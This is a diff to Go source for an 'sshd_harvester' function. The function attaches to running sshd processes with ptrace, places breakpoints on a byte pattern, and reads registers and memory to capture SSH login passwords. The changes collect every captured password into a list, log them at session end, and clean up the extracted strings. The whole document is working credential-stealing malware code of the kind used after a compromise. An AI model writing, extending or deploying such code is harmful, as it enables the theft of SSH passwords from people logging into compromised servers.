@@ -69,6 +69,9 @@ func sshd_harvester(pid int, logStream chan string, code_pattern []byte, reg_nam
 	traced_pids[pid] = true
 	traced_pids_mut.Unlock()
 
+	// passwords
+	passwords := make([]string, 1)
+
 	if code_pattern == nil {
 		code_pattern = []byte{0x48, 0x83, 0xc4, 0x08, 0x0f, 0xb6, 0xc0, 0x21}
 	}
@@ -241,6 +244,9 @@ handler:
 		success = true
 		util.LogStreamPrintf(logStream, "\n\nWe have password 0x%x (%s)\n\n", password, password)
 	}
+	if password != "" {
+		passwords = append(passwords, password)
+	}
 	// remove breakpoint
 	util.LogStreamPrintf(logStream, "Removing breakpoint")
 	_, err = unix.PtracePokeText(pid, pcode_pattern, code_pattern)
@@ -256,7 +262,9 @@ handler:
 		return
 	}
 	regs = dump_regs(pid, logStream)
-	dump_code(pid, uintptr(regs.Rip), logStream)
+	if regs != nil {
+		dump_code(pid, uintptr(regs.Rip), logStream)
+	}
 	// single step to execute original code
 	err = unix.PtraceSingleStep(pid)
 	if err != nil {
@@ -308,9 +316,19 @@ handler:
 	default:
 		util.LogStreamPrintf(logStream, "uncaught exit status of %d: %d", pid, wstatus.ExitStatus())
 	}
+
+	util.LogStreamPrintf(logStream, "SSHD session %d done, passwords are %s", pid, passwords)
 }
 
+// dump registers' values and the registers themselves
 func dump_regs(pid int, log_stream chan string) (regs *unix.PtraceRegs) {
+	regs = new(unix.PtraceRegs)
+	err := unix.PtraceGetRegs(pid, regs)
+	if err != nil {
+		util.LogStreamPrintf(log_stream, "dump code for %d failed: %v", pid, err)
+		return
+	}
+
 	// dump reg values
 	rax := read_reg_val(pid, "RAX", log_stream)
 	rdi := read_reg_val(pid, "RDI", log_stream)
@@ -370,7 +388,8 @@ func peek_text(pid int, addr uintptr, log_stream chan string) (read_bytes []byte
 		return
 	}
 	if util.AreBytesPrintable(read_bytes) {
-		return
+		// we only want the string, remove everything after the first null byte
+		return bytes.Split(read_bytes, []byte{0})[0]
 	}
 	res_str := hex.EncodeToString(read_bytes)
 	return []byte(res_str)
